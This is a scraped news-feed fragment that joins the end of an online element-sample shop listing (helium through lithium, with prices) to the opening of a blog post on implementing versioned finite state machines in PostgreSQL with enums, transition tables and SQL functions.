        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524860516178-PTTHI6OU3635DJQNZEZW/ke17ZwdGBToddI8pDm48kHHGgfyvBN3T_Jf1vxGCaX57gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UVLBiiomvsz1F1TULjjNWDVWfgk9JG7uNQYe8qmESclG2ombBdJUk8Dc7Ch2WAU4tg/Helium+%282%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524860516178-PTTHI6OU3635DJQNZEZW/ke17ZwdGBToddI8pDm48kHHGgfyvBN3T_Jf1vxGCaX57gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UVLBiiomvsz1F1TULjjNWDVWfgk9JG7uNQYe8qmESclG2ombBdJUk8Dc7Ch2WAU4tg/Helium+%282%29.JPG" data-image-dimensions="2362x1772" data-image-focal-point="0.5,0.5" alt="Helium (2).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Helium gas 99.99%</p>
            


<p><span>7.00</span>
</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-holmium" id="thumb-buy-holmium" data-item-id="586e1ddf29687f370f72737b">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483611618720-U898WGXOYI5SM8A36ZRR/ke17ZwdGBToddI8pDm48kI4770NBiJ2Z_w6XbENe-rd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmmzJBBHkqvGAibxByi2-xi7ZU6lvwTY8ytQp7VF07FSBNTR2gDqdmevTzCmw0m_0q/Holmium.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483611618720-U898WGXOYI5SM8A36ZRR/ke17ZwdGBToddI8pDm48kI4770NBiJ2Z_w6XbENe-rd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmmzJBBHkqvGAibxByi2-xi7ZU6lvwTY8ytQp7VF07FSBNTR2gDqdmevTzCmw0m_0q/Holmium.JPG" data-image-dimensions="1096x1137" data-image-focal-point="0.5,0.5" alt="Holmium.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Holmium metal 99.9% </p>
            


<p>
from <span>4.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/holmium-metal-9995-dendritic" id="thumb-holmium-metal-9995-dendritic" data-item-id="5aaec018f950b791b577a1c0">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1521401890969-QH8N28OQ0SBAROO6VC4V/ke17ZwdGBToddI8pDm48kC9Zp0IzcrWAMCmvRmAO95Z7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USR9Tbfbooi4KMNj32TYAsSK01OUeY1UIRwNOoi5nX0jEwxMEgIxbyhx36ExqSTl7Q/Holmium+%283%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1521401890969-QH8N28OQ0SBAROO6VC4V/ke17ZwdGBToddI8pDm48kC9Zp0IzcrWAMCmvRmAO95Z7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USR9Tbfbooi4KMNj32TYAsSK01OUeY1UIRwNOoi5nX0jEwxMEgIxbyhx36ExqSTl7Q/Holmium+%283%29.JPG" data-image-dimensions="2314x1434" data-image-focal-point="0.5,0.5" alt="Holmium (3).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Holmium metal 99.95% dendritic</p>
            


<p>
from <span>11.50</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/hydrogen-gas-9999" id="thumb-hydrogen-gas-9999" data-item-id="5ae386c5758d46243a7232af">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524860936208-KYJ35GWMMQZFFH6QYDXJ/ke17ZwdGBToddI8pDm48kGLpgOj-5VIb9-nmqOwIAkh7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URbqYXqGzFkciQ65dafWzrEhKE-f-5Adr56H2K5bsXVHKy7BkeBFh7SWF2GHSsLTdQ/Hydrogen.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524860936208-KYJ35GWMMQZFFH6QYDXJ/ke17ZwdGBToddI8pDm48kGLpgOj-5VIb9-nmqOwIAkh7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URbqYXqGzFkciQ65dafWzrEhKE-f-5Adr56H2K5bsXVHKy7BkeBFh7SWF2GHSsLTdQ/Hydrogen.JPG" data-image-dimensions="1803x1258" data-image-focal-point="0.5,0.5" alt="Hydrogen.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Hydrogen gas 99.99%</p>
            


<p>
from <span>7.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-indium" id="thumb-buy-indium" data-item-id="586f07ca59cc6846624cc92b">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1496555077222-OT2Q4R4SD6PL2DVP4XUN/ke17ZwdGBToddI8pDm48kIpl2HhJJ8DGav_RvZT5Kxx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0mhydAgiKdIfeAoxVgE7c7pm5tSvuecCuZMt6JSoZwufTvrOY0hhBDGCPsL4Mjv09g/Indium+%284%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1496555077222-OT2Q4R4SD6PL2DVP4XUN/ke17ZwdGBToddI8pDm48kIpl2HhJJ8DGav_RvZT5Kxx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0mhydAgiKdIfeAoxVgE7c7pm5tSvuecCuZMt6JSoZwufTvrOY0hhBDGCPsL4Mjv09g/Indium+%284%29.JPG" data-image-dimensions="2500x1518" data-image-focal-point="0.5,0.5" alt="Indium (4).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Indium metal 99.995%</p>
            


<p>
from <span>2.75</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-iodine" id="thumb-buy-iodine" data-item-id="586f0241c534a51ae5edbfbe">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1495325278698-1I5TVID8FEWXJ5JFFFKG/ke17ZwdGBToddI8pDm48kCHphlfybKGl6kkUjZ_wlXUUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcM8owZY0BXQFTKTqUSrLwK_F3QGddV-zC-HRwZ71DrfIdItVeusziLjV5zowaapOm/Iodine+%284%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1495325278698-1I5TVID8FEWXJ5JFFFKG/ke17ZwdGBToddI8pDm48kCHphlfybKGl6kkUjZ_wlXUUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcM8owZY0BXQFTKTqUSrLwK_F3QGddV-zC-HRwZ71DrfIdItVeusziLjV5zowaapOm/Iodine+%284%29.JPG" data-image-dimensions="1432x922" data-image-focal-point="0.5,0.5" alt="Iodine (4).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Iodine crystals 99.8% </p>
            


<p>
from <span>8.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-iridium-metal" id="thumb-buy-iridium-metal" data-item-id="589c4cdba5790a35876fe1bc">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1486638309260-FW2TEK55QG1CYGXR4LL2/ke17ZwdGBToddI8pDm48kGvuA-hBGx8f2D3wK2sSUIoUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcKXu7hcfeSSCc9l-FhBXJOOo6ymREZftI4Npei8Ddl_JBRoeGxlPA3KlD-Y_8pZoV/Iridium.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1486638309260-FW2TEK55QG1CYGXR4LL2/ke17ZwdGBToddI8pDm48kGvuA-hBGx8f2D3wK2sSUIoUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcKXu7hcfeSSCc9l-FhBXJOOo6ymREZftI4Npei8Ddl_JBRoeGxlPA3KlD-Y_8pZoV/Iridium.JPG" data-image-dimensions="1487x768" data-image-focal-point="0.5,0.5" alt="Iridium.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Iridium metal 99.95%</p>
            


<p>
from <span>9.50</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/iron-metal-990-block" id="thumb-iron-metal-990-block" data-item-id="587657781e5b6cf25289891c">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1534799119980-PRY9DCBYV547AHYIOBSH/ke17ZwdGBToddI8pDm48kAnuOWEQ1ww3wlEfVvbP9Ul7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0h8vX1l9k24HMAg-S2AFiemjQyNbXQ2xEbWQ6458TTryTUsSQuNDLIGrgMHqgI5jtg/Iron+%284%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1534799119980-PRY9DCBYV547AHYIOBSH/ke17ZwdGBToddI8pDm48kAnuOWEQ1ww3wlEfVvbP9Ul7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0h8vX1l9k24HMAg-S2AFiemjQyNbXQ2xEbWQ6458TTryTUsSQuNDLIGrgMHqgI5jtg/Iron+%284%29.JPG" data-image-dimensions="2500x1572" data-image-focal-point="0.5,0.5" alt="Iron (4).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Iron metal 99.95%</p>
            


<p>
from <span>2.50</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/krypton-gas-9999" id="thumb-krypton-gas-9999" data-item-id="5ae3881b2b6a28188c9b2558">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524860957334-QHATPDFD1PYMX7XRND71/ke17ZwdGBToddI8pDm48kBOuN2ZlQk9G86wmxGjABBB7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USmOO-LlPgZIb6f6y18nEveqK8DZeFbXe1-UJQdBB3zlNEw4A1CnthN4sEhA6M5VLw/Krypton.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524860957334-QHATPDFD1PYMX7XRND71/ke17ZwdGBToddI8pDm48kBOuN2ZlQk9G86wmxGjABBB7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USmOO-LlPgZIb6f6y18nEveqK8DZeFbXe1-UJQdBB3zlNEw4A1CnthN4sEhA6M5VLw/Krypton.JPG" data-image-dimensions="1975x1473" data-image-focal-point="0.5,0.5" alt="Krypton.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Krypton gas 99.99%</p>
            


<p><span>13.00</span>
</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-lanthanum" id="thumb-buy-lanthanum" data-item-id="58a3eaeb86e6c075a710b1d4">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1487137711192-V9QGDYFEQOIPS7I2XV8D/ke17ZwdGBToddI8pDm48kGgjWgElEs4O4T2izXJ22BJ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UeeCfJnpwubI97SgZGDM_dMkQ3AVHEDMYI53efSug_cYE4hy6oPwxxbBeLpDv6rxkA/Lanthanum.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1487137711192-V9QGDYFEQOIPS7I2XV8D/ke17ZwdGBToddI8pDm48kGgjWgElEs4O4T2izXJ22BJ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UeeCfJnpwubI97SgZGDM_dMkQ3AVHEDMYI53efSug_cYE4hy6oPwxxbBeLpDv6rxkA/Lanthanum.JPG" data-image-dimensions="2497x1860" data-image-focal-point="0.5,0.5" alt="Lanthanum.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Lanthanum metal 99.7% </p>
            


<p>
from <span>4.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/lead-metal-sheet" id="thumb-lead-metal-sheet" data-item-id="586e3480414fb5fe74235a11">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483617411057-RGQS51IURCGF2TML8B1Y/ke17ZwdGBToddI8pDm48kA6cmX6VteK04y8Eky2AX7kUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKc1fDRPLO9Ou2S1sotY0byZHcf1LT2ZvVlPmmmcviFl18u_AWfQDADKMon0Takcvo5/Lead.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483617411057-RGQS51IURCGF2TML8B1Y/ke17ZwdGBToddI8pDm48kA6cmX6VteK04y8Eky2AX7kUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKc1fDRPLO9Ou2S1sotY0byZHcf1LT2ZvVlPmmmcviFl18u_AWfQDADKMon0Takcvo5/Lead.JPG" data-image-dimensions="1448x822" data-image-focal-point="0.5,0.5" alt="Lead.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Lead metal 99.9% sheet</p>
            


<p>
from <span>2.50</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/lithium-metal-999" id="thumb-lithium-metal-999" data-item-id="5ae388f4575d1f244b18b6f0">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524861176948-VMW26G6XO5LYF6RK7YQA/ke17ZwdGBToddI8pDm48kNmyuSyrZSeHyaGjvEHcVeB7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UW-p9h4hlCYL03sn909tlEa59JF6JR8BuSD4JBp2lhupY7x6kDsGDMYkQIOJRDvK5g/Lithium.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524861176948-VMW26G6XO5LYF6RK7YQA/ke17ZwdGBToddI8pDm48kNmyuSyrZSeHyaGjvEHcVeB7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UW-p9h4hlCYL03sn909tlEa59JF6JR8BuSD4JBp2lhupY7x6kDsGDMYkQIOJRDvK5g/Lithium.JPG" data-image-dimensions="2059x1671" data-image-focal-point="0.5,0.5" alt="Lithium.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Lithium …</p></div></div></div></a></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://luciteria.com/elements-for-sale">https://luciteria.com/elements-for-sale</a></em></p>]]>
            </description>
            <link>https://luciteria.com/elements-for-sale</link>
            <guid isPermaLink="false">hacker-news-small-sites-24246299</guid>
            <pubDate>Sat, 22 Aug 2020 18:52:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Versioned Finite State Machines in Postgres]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24246147">thread link</a>) | @minxomat
<br/>
August 22, 2020 | https://raphael.medaer.me/2019/06/12/pgfsm.html | <a href="https://web.archive.org/web/*/https://raphael.medaer.me/2019/06/12/pgfsm.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Inspired by <a href="https://felixge.de/2017/07/27/implementing-state-machines-in-postgresql.html">Felix Geisendorfer blog post</a> I implemented a database FSM (Finite-State Machine) with Postgresql.
I brought some improvements to Felix’s implementation but before reading the following I recommend you to read carefully <a href="https://felixge.de/2017/07/27/implementing-state-machines-in-postgresql.html">the original post</a>.
<!--more--></p>

<p><strong>TL;DR</strong> Here are the changes I did:</p>

<ul>
  <li>Introduced a versioning control of the FSM.</li>
  <li>Optimized performances and data storage.</li>
  <li>Added some protection against user mistakes</li>
</ul>

<p>To keep it simple I’ll use exactly the same FSM graph than Felix: an ordering process with payment and shipment steps.</p>

<p><img src="https://raphael.medaer.me/assets/img/pgfsm-graph-v1.png" alt=""></p>

<h3 id="types-optimization">Types optimization</h3>

<p>First I replaced the storage of states/events from <code>text</code> to <code>enum</code>. Because I have a finite number of states and transitions I can properly store them as custom <code>enum</code>. It reduces the storage of these to a lighter and constant 4 bytes.</p>

<div><div><pre><code><span>CREATE</span> <span>TYPE</span> <span>order_state</span> <span>AS</span> <span>ENUM</span> <span>(</span>
  <span>'start'</span><span>,</span>
  <span>'awaiting_payment'</span><span>,</span>
  <span>'awaiting_shipment'</span><span>,</span>
  <span>'awaiting_refund'</span><span>,</span>
  <span>'shipped'</span><span>,</span>
  <span>'canceled'</span><span>,</span>
  <span>'error'</span>
<span>);</span>
<span>CREATE</span> <span>TYPE</span> <span>order_event</span> <span>AS</span> <span>ENUM</span> <span>(</span>
  <span>'create'</span><span>,</span>
  <span>'pay'</span><span>,</span>
  <span>'ship'</span><span>,</span>
  <span>'refund'</span><span>,</span>
  <span>'cancel'</span>
<span>);</span>
</code></pre></div></div>

<p>If later I have to add new state or event I can easily do:</p>

<div><div><pre><code><span>ALTER</span> <span>TYPE</span> <span>order_event</span> <span>ADD</span> <span>VALUE</span> <span>'my_new_event'</span><span>;</span>
</code></pre></div></div>

<p>Obviously it impacts the <code>order_events</code> table:</p>

<div><div><pre><code><span>CREATE</span> <span>TABLE</span> <span>order_events</span> <span>(</span>
  <span>id</span> <span>bigint</span> <span>GENERATED</span> <span>ALWAYS</span> <span>AS</span> <span>IDENTITY</span> <span>PRIMARY</span> <span>KEY</span><span>,</span>
  <span>order_id</span> <span>uuid</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>uuid_generate_v4</span><span>(),</span>
  <span>event</span> <span>order_event</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>'create'</span><span>,</span>
  <span>time</span> <span>timestamp</span> <span>DEFAULT</span> <span>now</span><span>()</span> <span>NOT</span> <span>NULL</span>
<span>);</span>
</code></pre></div></div>

<p>As you noticed I replaced the <code>order_id</code> type from <code>INT</code> to <code>uuid</code>. In brief because it’s out of scope: <a href="https://www.clever-cloud.com/blog/engineering/2015/05/20/why-auto-increment-is-a-terrible-idea/">I never use serial for fields going out of database</a>.</p>

<h3 id="transition-mechanism-improvements">Transition mechanism improvements</h3>

<p>In his implementation, Felix Geisendorfer is using a <code>switch</code> statement to implement the state transition.
It’s a fine and straightforward solution. However, if you have more states/events it could become hard to maintain. Furthermore if you want to version your FSM, you’ll often have to <code>CREATE OR REPLACE FUNCTION</code>.
Instead I created a <em>mapping table</em> with 3 columns:</p>

<ul>
  <li><code>state</code>: the current state</li>
  <li><code>event</code>: the event which causes the transition</li>
  <li><code>next_state</code>: the resulting state</li>
</ul>

<div><div><pre><code><span>CREATE</span> <span>TABLE</span> <span>order_events_transitions</span> <span>(</span>
  <span>state</span>      <span>order_state</span> <span>NOT</span> <span>NULL</span><span>,</span>
  <span>event</span>      <span>order_event</span> <span>NOT</span> <span>NULL</span><span>,</span>
  <span>next_state</span> <span>order_state</span> <span>NOT</span> <span>NULL</span><span>,</span>
  <span>PRIMARY</span> <span>KEY</span> <span>(</span><span>state</span><span>,</span> <span>event</span><span>,</span> <span>next_state</span><span>)</span>
<span>);</span>
</code></pre></div></div>

<p><em>AN: I can limit transitions to only one path for two given states with <code>PRIMARY KEY (state, event)</code>.</em></p>

<p>Any transition which is not in this table will be resolved as <code>error</code> state in our new transition function:</p>

<div><div><pre><code><span>CREATE</span> <span>FUNCTION</span> <span>order_events_transition</span><span>(</span><span>_state</span> <span>order_state</span><span>,</span> <span>_event</span> <span>order_event</span><span>)</span>
<span>RETURNS</span> <span>order_state</span> <span>LANGUAGE</span> <span>sql</span> <span>AS</span> <span>$$</span>
<span>SELECT</span> <span>COALESCE</span><span>(</span>
  <span>(</span><span>SELECT</span> <span>next_state</span> <span>FROM</span> <span>order_events_transitions</span> <span>WHERE</span> <span>state</span><span>=</span><span>_state</span> <span>AND</span> <span>event</span><span>=</span><span>_event</span><span>),</span>
  <span>'error'</span><span>::</span><span>order_state</span>
<span>);</span>
<span>$$</span><span>;</span>
</code></pre></div></div>

<p><em>AN: There is maybe a better way then “COALESCE” to implement the “default”…</em></p>

<p>OK! It’s now time to write valid transitions:</p>

<div><div><pre><code><span>INSERT</span> <span>INTO</span> <span>order_events_transitions</span> <span>VALUES</span>
  <span>(</span><span>'start'</span><span>,</span>             <span>'create'</span><span>,</span> <span>'awaiting_payment'</span> <span>),</span>
  <span>(</span><span>'awaiting_payment'</span><span>,</span>  <span>'pay'</span><span>,</span>    <span>'awaiting_shipment'</span><span>),</span>
  <span>(</span><span>'awaiting_payment'</span><span>,</span>  <span>'cancel'</span><span>,</span> <span>'canceled'</span>         <span>),</span>
  <span>(</span><span>'awaiting_shipment'</span><span>,</span> <span>'cancel'</span><span>,</span> <span>'awaiting_refund'</span>  <span>),</span>
  <span>(</span><span>'awaiting_shipment'</span><span>,</span> <span>'ship'</span><span>,</span>   <span>'shipped'</span>          <span>),</span>
  <span>(</span><span>'awaiting_refund'</span><span>,</span>   <span>'refund'</span><span>,</span> <span>'canceled'</span>         <span>);</span>
</code></pre></div></div>

<h3 id="fsm-graph-versioning">FSM graph versioning</h3>

<p>In real life my use cases and business processes are moving (fast). Probably yours as well.
Since the FSM I build is the implementation of this processes, each change IRL impacts my database design.</p>

<p>For instance a state <code>awaiting_approval</code> could be added before allowing to pay.</p>

<p><img src="https://raphael.medaer.me/assets/img/pgfsm-graph-v2.png" alt=""></p>

<p>If I change my transition function and table without taking care of past <code>order_events</code>, I will completly break my FSM. Indeed because I’m moving the <code>create</code> event, all the already recorded transitions will raise an <code>error</code> state. It’s not <a href="https://en.wikipedia.org/wiki/Maintainability">maintainable</a>!</p>

<blockquote>
  <p>How to handle multiple versions of my FSM graph ?</p>
</blockquote>

<p>Introducing version control in my design will solve this issue.</p>

<p>First I create a table to store the versions and their status:</p>

<div><div><pre><code><span>CREATE</span> <span>TYPE</span> <span>order_fsm_version_status</span> <span>AS</span> <span>ENUM</span> <span>(</span>
  <span>'live'</span><span>,</span>
  <span>'deprecated'</span><span>,</span>
  <span>'obsolete'</span>
<span>);</span>
<span>CREATE</span> <span>TABLE</span> <span>order_fsm_versions</span><span>(</span>
  <span>version</span> <span>integer</span> <span>GENERATED</span> <span>ALWAYS</span> <span>AS</span> <span>IDENTITY</span> <span>PRIMARY</span> <span>KEY</span><span>,</span>
  <span>status</span>  <span>order_fsm_version_status</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>'live'</span>
<span>);</span>
</code></pre></div></div>

<p>In the meanwhile I create a function to get the last FSM up-and-running version:</p>

<div><div><pre><code><span>CREATE</span> <span>FUNCTION</span> <span>order_fsm_last_version</span><span>()</span>
<span>RETURNS</span> <span>integer</span> <span>LANGUAGE</span> <span>sql</span> <span>AS</span> <span>$$</span>
<span>SELECT</span> <span>version</span> <span>FROM</span> <span>order_fsm_versions</span> <span>WHERE</span> <span>status</span><span>=</span><span>'live'</span> <span>ORDER</span> <span>BY</span> <span>version</span> <span>DESC</span> <span>LIMIT</span> <span>1</span><span>;</span>
<span>$$</span><span>;</span>
</code></pre></div></div>
<p>Both <code>order_events</code> and <code>order_events_transitions</code> will need to reference this version:</p>

<div><div><pre><code><span>CREATE</span> <span>TABLE</span> <span>order_events</span> <span>(</span>
  <span>id</span>       <span>bigint</span>      <span>GENERATED</span> <span>ALWAYS</span> <span>AS</span> <span>IDENTITY</span> <span>PRIMARY</span> <span>KEY</span><span>,</span>
  <span>order_id</span> <span>uuid</span>        <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>uuid_generate_v4</span><span>(),</span>
  <span>event</span>    <span>order_event</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>'create'</span><span>,</span>
  <span>version</span>  <span>integer</span>     <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>order_fsm_last_version</span><span>(),</span>
  <span>time</span>     <span>timestamp</span>   <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>now</span><span>(),</span>
  <span>FOREIGN</span> <span>KEY</span> <span>(</span><span>version</span><span>)</span> <span>REFERENCES</span> <span>order_fsm_versions</span><span>(</span><span>version</span><span>)</span>
<span>);</span>

<span>CREATE</span> <span>TABLE</span> <span>order_events_transitions</span> <span>(</span>
  <span>state</span>      <span>order_state</span> <span>NOT</span> <span>NULL</span><span>,</span>
  <span>event</span>      <span>order_event</span> <span>NOT</span> <span>NULL</span><span>,</span>
  <span>version</span>    <span>integer</span>     <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>order_fsm_last_version</span><span>(),</span>
  <span>next_state</span> <span>order_state</span> <span>NOT</span> <span>NULL</span><span>,</span>
  <span>PRIMARY</span> <span>KEY</span> <span>(</span><span>state</span><span>,</span> <span>event</span><span>,</span> <span>version</span><span>,</span> <span>next_state</span><span>),</span>
  <span>FOREIGN</span> <span>KEY</span> <span>(</span><span>version</span><span>)</span> <span>REFERENCES</span> <span>order_fsm_versions</span><span>(</span><span>version</span><span>)</span>
<span>);</span>
</code></pre></div></div>

<p>The transition function and its aggregate also have to take care of this version number:</p>

<div><div><pre><code><span>CREATE</span> <span>FUNCTION</span> <span>order_events_transition</span><span>(</span>
  <span>_state</span> <span>order_state</span><span>,</span>
  <span>_event</span> <span>order_event</span><span>,</span>
  <span>_version</span> <span>integer</span> <span>DEFAULT</span> <span>order_fsm_last_version</span><span>()</span>
<span>)</span> <span>RETURNS</span> <span>order_state</span> <span>LANGUAGE</span> <span>sql</span> <span>AS</span> <span>$$</span>
  <span>SELECT</span> <span>COALESCE</span><span>(</span>
    <span>(</span><span>SELECT</span> <span>next_state</span>
     <span>FROM</span> <span>order_events_transitions</span>
